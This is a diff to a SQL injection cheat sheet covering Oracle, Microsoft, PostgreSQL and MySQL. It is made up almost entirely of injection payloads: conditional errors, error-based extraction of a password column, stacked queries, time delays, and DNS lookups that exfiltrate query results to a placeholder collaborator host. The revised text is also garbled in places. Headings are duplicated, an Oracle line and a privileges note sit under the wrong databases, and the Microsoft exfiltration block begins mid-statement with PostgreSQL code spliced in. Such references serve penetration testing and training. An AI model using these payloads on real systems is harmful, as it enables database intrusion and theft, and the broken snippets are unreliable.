@@ -103,16 +103,16 @@ MySQL
 Test a boolean condition and trigger an error if true.
 
 Oracle  
-`SELECT CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`
+`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`
 
 Microsoft  
-`SELECT CASE WHEN (condition) THEN 1/0 ELSE NULL END`
+`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`
 
 PostgreSQL  
-`1 = (SELECT CASE WHEN (condition) THEN 1/(SELECT 0) ELSE NULL END)`
+`1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`
 
 MySQL  
-`SELECT IF(condition,(SELECT table_name FROM information_schema.tables),'a')`
+`SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`
 
 ---
 
@@ -121,19 +121,19 @@ MySQL
 Microsoft  
 
 SELECT 'foo' WHERE 1 = (SELECT 'secret')
--- Conversion failed when converting varchar 'secret' to int
+> Conversion failed when converting the varchar value 'secret' to data type int.
 
 
 PostgreSQL  
 
 SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
--- invalid input syntax for integer
+> invalid input syntax for integer: "secret"
 
 
 MySQL  
 
-SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c,(SELECT 'secret')))
--- XPATH syntax error
+SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
+> XPATH syntax error: '\secret'
 
 
 ---
@@ -144,13 +144,14 @@ Oracle
 Not supported
 
 Microsoft  
-`QUERY-1; QUERY-2`
+`QUERY-1-HERE; QUERY-2-HERE
+QUERY-1-HERE QUERY-2-HERE`
 
 PostgreSQL  
-`QUERY-1; QUERY-2`
+`QUERY-1-HERE; QUERY-2-HERE`
 
 MySQL  
-`QUERY-1; QUERY-2`
+`QUERY-1-HERE; QUERY-2-HERE`
 
 Note: MySQL stacked queries may not always work depending on API.
 
@@ -175,66 +176,61 @@ MySQL
 ## Conditional Time Delays
 
 Oracle  
-`SELECT CASE WHEN (condition) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`
+`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`
 
 Microsoft  
-`IF (condition) WAITFOR DELAY '0:0:10'`
+`IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`
 
 PostgreSQL  
-`SELECT CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END`
+`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`
 
 MySQL  
-`SELECT IF(condition,SLEEP(10),'a')`
+`SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`
 
 ---
 
 ## DNS Lookup
+DNS Lookup
 
 Oracle  
 
-SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
 
-<!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR/"> %remote;]>'),'/l')
-
-FROM dual
-
+### technique works on fully patched Oracle installations, but requires elevated privileges:
 
 Microsoft  
-`exec master..xp_dirtree '//BURP-COLLABORATOR/a'`
+`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
+exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`
 
 PostgreSQL  
-`copy (SELECT '') to program 'nslookup BURP-COLLABORATOR'`
+`copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`
 
 MySQL (Windows only)  
-`LOAD_FILE('\\\\BURP-COLLABORATOR\\a')`
+`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`
 
 ---
 
 ## DNS Lookup with Data Exfiltration
 
 Oracle  
-
-SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [
-
-<!ENTITY % remote SYSTEM "http://'||(SELECT data)||'.BURP/"> %remote;]>'),'/l')
-
-FROM dual
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
 
 
 Microsoft  
 
-DECLARE @p VARCHAR(1024);
-SET @p=(SELECT data);
-EXEC('master..xp_dirtree "//'+@p+'.BURP/a"')
-
+HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
+create OR replace function f() returns void as $$
+declare c text;
+declare p text;
+begin
 
 PostgreSQL  
 
-CREATE OR REPLACE FUNCTION f() RETURNS void AS $$
-DECLARE c text;
-DECLARE p text;
-BEGIN
-SELECT INTO p (SELECT data);
-c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP''';
-EXECUTE c;
+c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
+execute c;
 END;
+$$ language plpgsql security definer;
+SELECT f();
